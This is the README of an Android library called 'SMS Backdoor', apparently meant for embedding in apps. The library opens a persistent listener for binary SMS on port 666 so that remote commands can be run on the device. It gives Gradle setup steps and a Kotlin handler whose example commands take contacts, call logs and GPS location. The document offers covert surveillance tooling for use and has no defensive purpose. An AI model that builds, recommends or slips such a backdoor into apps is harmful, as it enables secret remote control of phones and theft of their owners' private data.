[![Release](https://jitpack.io/v/evilthreads669966/smsbackdoor.svg)](https://jitpack.io/#evilthreads669966/smsbackdoor)&nbsp;&nbsp;[![API](https://img.shields.io/badge/API-23%2B-brightgreen.svg?style=plastic)](https://android-arsenal.com/api?level=23)
# SMS Backdoor
### An Android library that opens a persistent SMS backdoor for binary SMS messages with the ability to define your own remote commands.

### User Instructions
1. Add the maven repository to your project's build.gradle file
```gradle
allprojects {
    repositories {
        ...
        maven { url 'https://jitpack.io' }
    }
}
```
2. Add the dependency to your app's build.gradle file
```gradle
dependencies {
    implementation 'com.github.evilthreads669966:smsbackdoor:0.0.3'
}
```
3.  Open the binary sms backdoor inside your Activity and pass in your command code and define your remote commands handler. Make sure to request RECEIVE_SMS permission before opening it.
```kotlin
//666: is the command code. So you would start all of your remote commands for example: 666: COMMAND_GET_CONTACTS
SmsBackdoor.openDoor(this, "666:"){ remoteCommand ->
    when(remoteCommand){
        "COMMAND_GET_CONTACTS" -> //get contacts
        "COMMAND_GET_CALL_LOG" -> //get call log
        "COMMAND_GET_LOCATION" -> //get gps location
        else -> //command not found
    }
}
```
4. The sms backdoor is using port 666 for binary sms messages.
## License
```
Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```
